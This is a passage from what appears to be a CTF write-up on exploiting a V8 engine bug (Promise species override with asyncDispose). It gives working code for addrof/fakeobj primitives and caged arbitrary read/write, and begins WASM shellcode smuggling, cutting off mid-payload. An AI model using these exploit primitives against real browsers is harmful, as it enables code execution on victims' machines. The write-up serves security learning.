</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>unTag</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&amp;</span> <span class=o>~</span><span class=p>(</span><span class=mi>1</span><span class=nx>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>toSmi</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=nx>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>fromSmi</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=nx>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// get low dword
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>low</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&amp;</span> <span class=nx>BigInt</span><span class=p>(</span><span class=mh>0xffffffff</span><span class=nx>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// get high dword
</span></span></span><span class=line><span class=cl><span class=nx>BigInt</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>high</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>this</span> <span class=o>&gt;&gt;</span> <span class=nx>BigInt</span><span class=p>(</span><span class=mi>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Convert a Number to hex representation
</span></span></span><span class=line><span class=cl><span class=nb>Number</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>hex</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;0x&#39;</span> <span class=o>+</span> <span class=k>this</span><span class=p>.</span><span class=nx>toString</span><span class=p>(</span><span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Convert a Number (float) to integer representation
</span></span></span><span class=line><span class=cl><span class=nb>Number</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>f2i</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>float_view</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=k>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>int_view</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>pack</span><span class=p>(</span><span class=nx>low</span><span class=p>,</span> <span class=nx>high</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>low</span> <span class=o>|</span> <span class=p>(</span><span class=nx>high</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>sleepFor</span><span class=p>(</span><span class=nx>sleepDuration</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>now</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Date</span><span class=p>().</span><span class=nx>getTime</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=k>new</span> <span class=nb>Date</span><span class=p>().</span><span class=nx>getTime</span><span class=p>()</span> <span class=o>&lt;</span> <span class=nx>now</span> <span class=o>+</span> <span class=nx>sleepDuration</span><span class=p>)</span> <span class=p>{</span> <span class=cm>/* do nothing */</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>loghex</span><span class=p>(</span><span class=nx>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>x</span><span class=p>.</span><span class=nx>hex</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span><span class=o>*</span> <span class=nx>generator</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>yield</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>gen</span> <span class=o>=</span> <span class=nx>generator</span><span class=p>();</span>   
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>corrupted_arr</span> <span class=o>=</span> <span class=p>[</span><span class=mf>1.1</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>obj</span> <span class=o>=</span> <span class=p>{</span><span class=nx>a</span> <span class=o>:</span> <span class=mf>1.1</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>obj2</span> <span class=o>=</span> <span class=p>{</span><span class=nx>b</span><span class=o>:</span> <span class=mf>2.2</span><span class=p>,</span> <span class=nx>c</span><span class=o>:</span><span class=mf>3.3</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>victim</span> <span class=o>=</span> <span class=p>[</span><span class=nx>obj</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>MyConstructor</span><span class=p>(</span><span class=nx>executor</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>myResolve</span><span class=p>(</span><span class=nx>value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>myReject</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>executor</span><span class=p>(</span><span class=nx>myResolve</span><span class=p>,</span> <span class=nx>myReject</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>corrupted_arr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Object</span><span class=p>.</span><span class=nx>defineProperty</span><span class=p>(</span><span class=nb>Promise</span><span class=p>,</span> <span class=nx>Symbol</span><span class=p>.</span><span class=nx>species</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;value&#34;</span><span class=o>:</span> <span class=nx>MyConstructor</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>gen</span><span class=p>[</span><span class=nx>Symbol</span><span class=p>.</span><span class=nx>asyncDispose</span><span class=p>]();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=mi>50</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;i: &#34;</span> <span class=o>+</span> <span class=nx>i</span> <span class=o>+</span> <span class=s2>&#34; high: &#34;</span> <span class=o>+</span> <span class=nx>corrupted_arr</span><span class=p>[</span><span class=nx>i</span><span class=p>].</span><span class=nx>f2i</span><span class=p>().</span><span class=nx>high</span><span class=p>().</span><span class=nx>hex</span><span class=p>()</span> <span class=o>+</span> <span class=s2>&#34; low: &#34;</span> <span class=o>+</span> <span class=nx>corrupted_arr</span><span class=p>[</span><span class=nx>i</span><span class=p>].</span><span class=nx>f2i</span><span class=p>().</span><span class=nx>low</span><span class=p>().</span><span class=nx>hex</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>victim</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>obj2</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=mi>50</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;i: &#34;</span> <span class=o>+</span> <span class=nx>i</span> <span class=o>+</span> <span class=s2>&#34; high: &#34;</span> <span class=o>+</span> <span class=nx>corrupted_arr</span><span class=p>[</span><span class=nx>i</span><span class=p>].</span><span class=nx>f2i</span><span class=p>().</span><span class=nx>high</span><span class=p>().</span><span class=nx>hex</span><span class=p>()</span> <span class=o>+</span> <span class=s2>&#34; low: &#34;</span> <span class=o>+</span> <span class=nx>corrupted_arr</span><span class=p>[</span><span class=nx>i</span><span class=p>].</span><span class=nx>f2i</span><span class=p>().</span><span class=nx>low</span><span class=p>().</span><span class=nx>hex</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:694/1*1Me2NqYN-4B0nzi8ofV5-A.png alt title="I have to look for 0x1085421 in memory"><figcaption>I have to look for 0x1085421 in memory</figcaption></figure></p><p>There are quite a few references to the address of the element in the heap memory, the first few ones are irrelevant to me (this can be checked by changing the victim element to another object and rechecking the values in memory). I am interested in the pointer stored in the elements field.</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:448/1*VHgj4KWlAkUI8r1z2CG70A.png alt title="Our target"><figcaption>Our target</figcaption></figure></p><p>Let’s check if this is the valid one. In the code I printed the state of the memory after having obj as the element of victim, after that the state of when obj is replaced with obj2.</p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*mF8BpMVPm60769ORp9Nm2g.png alt title="The new address I need to check is 0x1085475"><figcaption>The new address I need to check is 0x1085475</figcaption></figure></p><p><figure><img src=https://miro.medium.com/v2/resize:fit:474/1*NMp0WMwb9FQ7xgop42huVA.png alt></figure></p><p>So corrupted_arr[35] contains the address of the first element in the victim array.</p><p>This allows me to read the address of whatever is in victim[0], and forge a fake object by replacing that address with the address of another heap object.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>function</span> <span class=nx>fakeaddr</span><span class=p>(</span><span class=nx>obj_</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>victim</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>obj_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>corrupted_arr</span><span class=p>[</span><span class=mi>35</span><span class=p>].</span><span class=nx>f2i</span><span class=p>().</span><span class=nx>high</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>fakeobj</span><span class=p>(</span><span class=nx>addr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>corrupted_arr</span><span class=p>[</span><span class=mi>35</span><span class=p>]</span> <span class=o>=</span> <span class=nx>addr</span><span class=p>.</span><span class=nx>i2f</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>victim</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>Testing it out, everything seems to work:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// snip
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>gen</span><span class=p>[</span><span class=nx>Symbol</span><span class=p>.</span><span class=nx>asyncDispose</span><span class=p>]();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>obj</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>obj2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//for (let i = 0; i &lt; 50; i++) {
</span></span></span><span class=line><span class=cl><span class=c1>//    console.log(&#34;i: &#34; + i + &#34; high: &#34; + corrupted_arr[i].f2i().high().hex() + &#34; low: &#34; + corrupted_arr[i].f2i().low().hex())
</span></span></span><span class=line><span class=cl><span class=c1>//}
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//victim[0] = obj2;
</span></span></span><span class=line><span class=cl><span class=c1>//%DebugPrint(victim);
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//for (let i = 0; i &lt; 50; i++) {
</span></span></span><span class=line><span class=cl><span class=c1>//    console.log(&#34;i: &#34; + i + &#34; high: &#34; + corrupted_arr[i].f2i().high().hex() + &#34; low: &#34; + corrupted_arr[i].f2i().low().hex())
</span></span></span><span class=line><span class=cl><span class=c1>//}
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>addrof</span><span class=p>(</span><span class=nx>obj_</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>victim</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>obj_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>corrupted_arr</span><span class=p>[</span><span class=mi>35</span><span class=p>].</span><span class=nx>f2i</span><span class=p>().</span><span class=nx>high</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>fakeobj</span><span class=p>(</span><span class=nx>addr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>corrupted_arr</span><span class=p>[</span><span class=mi>35</span><span class=p>]</span> <span class=o>=</span> <span class=nx>pack</span><span class=p>(</span><span class=nx>corrupted_arr</span><span class=p>[</span><span class=mi>35</span><span class=p>].</span><span class=nx>f2i</span><span class=p>().</span><span class=nx>low</span><span class=p>(),</span> <span class=nx>addr</span><span class=p>).</span><span class=nx>i2f</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>victim</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>loghex</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=nx>obj</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>loghex</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=nx>obj2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>fakeobj</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=nx>obj</span><span class=p>)));</span></span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:548/1*tJV4TBh1UPvNvGssAMnvlw.png alt title="First objet’s address"><figcaption>First objet’s address</figcaption></figure></p><p><figure><img src=https://miro.medium.com/v2/resize:fit:537/1*vg8-8HakZCopcjOxJX9zpw.png alt title="Second objet’s address"><figcaption>Second objet’s address</figcaption></figure></p><p><figure><img src=https://miro.medium.com/v2/resize:fit:156/1*vMzaJZE8Ld7QIvSF2NhwNA.png alt title="Values returned by addrof"><figcaption>Values returned by addrof</figcaption></figure></p><p><figure><img src=https://miro.medium.com/v2/resize:fit:700/1*tL_4Uii8em7W55kvXM6L9Q.png alt title="Output of %DebugPrint(fakeobj(…))"><figcaption>Output of %DebugPrint(fakeobj(…))</figcaption></figure></p><h4 class="relative group">Caged arbitrary read & write<div id=caged-arbitrary-read--write class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#caged-arbitrary-read--write aria-label=Anchor>#</a></span></h4><p>Now it’s time to make the caged arbitrary read and write primitives.</p><p>Usually in V8 exploits you’re supposed to change the map of a floats array with the map of an objects array and use the fakeobj primitive to trick V8 into dereferencing an arbitrary address you provide.</p><p>But in this case since the OOB’s range is so long I can change the elements pointer of a float array to make it read and write anywhere I want it to in the heap.</p><p>First I’ll have to make a new float array that I’ll use for the RW primitives, and then look for its element pointer in memory (like I did for finding the addresses before).</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>// &lt;snip&gt;
</span></span><span class=line><span class=cl>rw_arr = [1.1];
</span></span><span class=line><span class=cl>%DebugPrint(rw_arr);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>for (let i = 0; i &lt; 200; i++) {
</span></span><span class=line><span class=cl>    console.log(&#34;i: &#34; + i + &#34; high: &#34; + corrupted_arr[i].f2i().high().hex() + &#34; low: &#34; + corrupted_arr[i].f2i().low().hex())
</span></span><span class=line><span class=cl>}</span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:626/1*b0Ui3rqhPr7MbW15nTRmuw.png alt title="I have to look for 0x1085981 in memory"><figcaption>I have to look for 0x1085981 in memory</figcaption></figure></p><p><figure><img src=https://miro.medium.com/v2/resize:fit:398/1*H8-svu8OGrY1eBwZB-tUmw.png alt title="Found it at i = 175"><figcaption>Found it at i = 175</figcaption></figure></p><p>Remember that elements are located 0x8 bytes after the address of elements.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>4 bytes   | 4 bytes
</span></span><span class=line><span class=cl>-------------------
</span></span><span class=line><span class=cl>MAP       | BACKING ARRAY LENGTH
</span></span><span class=line><span class=cl>       ELEMENT 1</span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:588/1*EKSOhJIFfCz_CZmn4ZqN8w.png alt title="What elements point to"><figcaption>What elements point to</figcaption></figure></p><p><figure><img src=https://miro.medium.com/v2/resize:fit:378/1*6IrY_mNCoG-LadwQI52C3Q.png alt title="The element of our array"><figcaption>The element of our array</figcaption></figure></p><p>So when changing this pointer I should make it point 8 bytes before the address where I want to read/write.</p><ul><li>Also a small note here : when writing things in memory with a float array, I write a full 8 byte value everytime, therefore I must be careful to preserve what was in the lower/higher 4 bytes of the place I write to. In this case I only want to change the lower 4 bytes that contain the elements offset, so I must add the value I will write with the higher 4 bytes aswell before writing.</li></ul><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>function caged_read(addr) { 
</span></span><span class=line><span class=cl>        corrupted_arr[175] = ((0x200000000n) + addr-0x08n).i2f()
</span></span><span class=line><span class=cl>        return rw_arr[0].f2i()
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function caged_write(addr, value) { 
</span></span><span class=line><span class=cl>        corrupted_arr[175] = ((0x200000000n) + addr-0x08n).i2f()
</span></span><span class=line><span class=cl>        rw_arr[0] = value.i2f()
</span></span><span class=line><span class=cl>}</span></span></code></pre></div></div><p>I substracted 8 from the address I want to read/write to in order to account for the 8 byte offset discussed earlier.</p><p>I added 0x2 as it is the length of the array encoded as an SMI, it is shifted to the right to allow space for the address.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>4 bytes                | 4 bytes
</span></span><span class=line><span class=cl>--------------------------------------
</span></span><span class=line><span class=cl>ELEMENTS &lt;- addr - 0x8 | LENGTH &lt;- 0x2
</span></span><span class=line><span class=cl>--------------------------------------</span></span></code></pre></div></div><p>Let’s test if everything is working as expected:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>test = {&#39;b&#39;: 2.2};
</span></span><span class=line><span class=cl>%DebugPrint(test);
</span></span><span class=line><span class=cl>loghex(caged_read(addrof(test)));
</span></span><span class=line><span class=cl>caged_write(addrof(test), 0xdeadbeefn)
</span></span><span class=line><span class=cl>loghex(caged_read(addrof(test)));</span></span></code></pre></div></div><p><figure><img src=https://miro.medium.com/v2/resize:fit:541/1*eU3wNoXnflGF1htTC6pytQ.png alt></figure></p><p><figure><img src=https://miro.medium.com/v2/resize:fit:202/1*68XVXQmrCa6rGCKBkiPDwQ.png alt></figure></p><p><figure><img src=https://miro.medium.com/v2/resize:fit:571/1*PGG0Bxti05j8lkJzIxNxuw.png alt></figure></p><p>Everything works! Now that I have all of the primitives I need I will use them to get code execution.</p><h4 class="relative group">Code execution through WASM shellcode smuggling<div id=code-execution-through-wasm-shellcode-smuggling class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#code-execution-through-wasm-shellcode-smuggling aria-label=Anchor>#</a></span></h4><p>In the real world, V8 has an additional layer of security: Ubercage, V8’s sandbox.</p><p>How this sandbox works is that any and every ‘dangerous’ pointer is moved out of the heap into a trusted zone, and to access these pointers the heap only stores an offset used to traverse a pointer table.</p><p>Since this ctf challenge is rather simple the V8 sandbox is disabled and I can find the pointer to the WASM page I create rather easily.</p><p>There are various ways to get execution in V8, I will use WASM shellcode smuggling in this case.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>wasm_code</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uint8Array</span><span class=p>([</span>
</span></span><span class=line><span class=cl><span class=mi>0</span><span class=p>,</span><span class=mi>97</span><span class=p>,</span><span class=mi>115</span><span class=p>,</span><span class=mi>109</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>96</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>19</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>116</span><span class=p>,</span><span class=mi>114</span><span class=p>,</span><span class=mi>105</span><span class=p>,</span><span class=mi>103</span><span class=p>,</span><span class=mi>103</span><span class=p>,</span><span class=mi>101</span><span class=p>,</span><span class=mi>114</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>115</span><span class=p>,</span><span class=mi>104</span><span class=p>,</span><span class=mi>101</span><span class=p>,</span><span class=mi>108</span><span class=p>,</span><span class=mi>108</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>99</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>93</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>44</span><span class=p>,</span><span class=o>-</span><span class=mi>68</span><span class=p>,</span><span class=o>-</span><span class=mi>59</span><span class=p>,</span><span class=o>-</span><span class=mi>7</span><span class=p>,</span><span class=o>-</span><span class=mi>113</span><span class=p>,</span><span class=o>-</span><span class=mi>110</span><span class=p>,</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span><span class=o>-</span><span class=mi>11</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>70</span><span class=p>,</span><span class=o>-</span><span class=mi>95</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span><span class=o>-</span><span class=mi>11</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>16</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>79</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>65</span><span class=p>,</span><span class=o>-</span><span class=mi>88</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>110</span><span class=p>,</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span><span class=o>-</span><span class=mi>11</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>24</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>72</span><span class=p>,</span><span class=o>-</span><span class=mi>9</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span><span class=o>-</span><span class=mi>11</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>32</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>44</span><span class=p>,</span><span class=o>-</span><span class=mi>66</span><span class=p>,</span><span class=o>-</span><span class=mi>59</span><span class=p>,</span><span class=o>-</span><span 